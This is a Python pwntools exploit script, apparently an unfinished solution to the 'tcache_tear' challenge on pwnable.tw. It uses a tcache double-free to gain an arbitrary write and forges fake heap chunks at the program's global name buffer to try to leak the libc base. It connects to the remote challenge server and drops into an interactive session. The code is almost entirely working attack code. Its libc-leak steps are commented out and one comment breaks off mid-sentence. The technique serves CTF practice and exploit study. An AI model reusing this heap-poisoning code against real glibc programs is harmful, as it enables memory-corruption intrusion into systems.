#!/usr/bin/env python3

from pwn import *

QWORD = 8
DUMMY = 0xdeadbeef

elf = ELF("./tcache_tear_patched")
libc = ELF("./given/libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
ld = ELF("./ld-2.27.so")


def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10400)
    else:
        p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
        if args.D:
            gdb.attach(p, """
                b *0x400c70
            """)
    return p

class FakeChunk:
    def __init__(self, prev_size=0, size=0, fwd=0, bck=0, A=0, M=0, P=0):
        size = max(size, 0x10)
        self.prev_size = prev_size
        self.size = size
        self.size_slot = self.size | (A<<2) | (M << 1) | P
        print(hex(self.size_slot))
        self.fwd = fwd
        self.bck = bck

    def pack(self):
        payload = p64(self.prev_size) + p64(self.size_slot) + p64(self.fwd)
        payload += p64(self.bck)
        payload = payload.ljust(self.size, b"\x00")
        return payload

def malloc(size, data, p):
    p.recvuntil(b"Your choice :")
    p.sendline(b"1")

    p.recvuntil(b"Size:")
    p.sendline(str(size).encode())

    p.recvuntil(b"Data:")
    p.sendline(data)

def free(p):
    p.recvuntil(b"Your choice :")
    p.sendline(b"2")

def print_name_buf(p):
    p.recvuntil(b"Your choice :")
    p.sendline(b"3")

    p.recvuntil(b"Name :")
    name = p.recvn(0x20)
    return name

def leak_libc_base(p):
    # info
    data_name_buf = 0x602060
    data_heap_ptr = 0x602088
    CHUNK_HEADER_SIZE = 0x10

    # We want to place chunk0 at data_name_buf
    # so that we can leak things later
    chunk0_data_addr = data_name_buf
    chunk0_hdr_addr = chunk0_data_addr - CHUNK_HEADER_SIZE
    size_until_heap_ptr = data_heap_ptr - chunk0_hdr_addr
    chunk0 = FakeChunk(size=0x500, P=1)
    # However, we cannot

    # create chunk1 to bypass some checks
    chunk1_addr = chunk0_hdr_addr + chunk0.size
    chunk1 = FakeChunk(size=0x40, P=1)
    chunk2 = FakeChunk(prev_size=chunk1.size)
    payload = chunk1.pack() + chunk2.pack()[:QWORD]
    arbit_write(chunk1_addr, payload, 0x60, p)

    payload = chunk0.pack()[:size_until_heap_ptr] + p64(chunk0_data_addr)
    arbit_write(chunk0_hdr_addr, payload, 0x70, p)

    # free(p)

    #leak = print_name_buf(p)
    #libc_unsorted_bin = u64(leak[:8])
    #print("libc leak: {}".format(hex(libc_unsorted_bin)))


def arbit_write(addr, value, size, p):
    assert(size < 0x100)
    assert(len(value) + 0x10 <= size)

    print("arbitrary write with size: {}".format(size))
    malloc(size, p64(DUMMY), p)
    free(p)
    free(p)

    malloc(size, p64(addr), p)
    malloc(size, p64(DUMMY), p)
    malloc(size, value, p)

def exploit():
    p = conn()

    size = 0xff
    data_name_buf = 0x602060
    p.recvuntil(b"Name:")
    p.sendline(b"pingjui")

    leak_libc_base(p)

    p.interactive()


if __name__ == "__main__":
    exploit()
